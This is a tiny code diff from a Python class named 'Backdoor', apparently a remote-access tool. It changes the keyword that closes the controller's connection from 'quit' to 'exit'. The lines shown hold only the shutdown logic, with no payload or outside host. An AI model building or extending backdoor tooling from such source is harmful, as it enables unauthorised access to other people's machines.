@@ -53,7 +53,7 @@ class Backdoor:
 					self.my_connection.close()
 					exit()
 
-				if command[0] == "quit":
+				if command[0] == "exit":
 					print("Connection closed.")
 					self.my_connection.close()
 					break
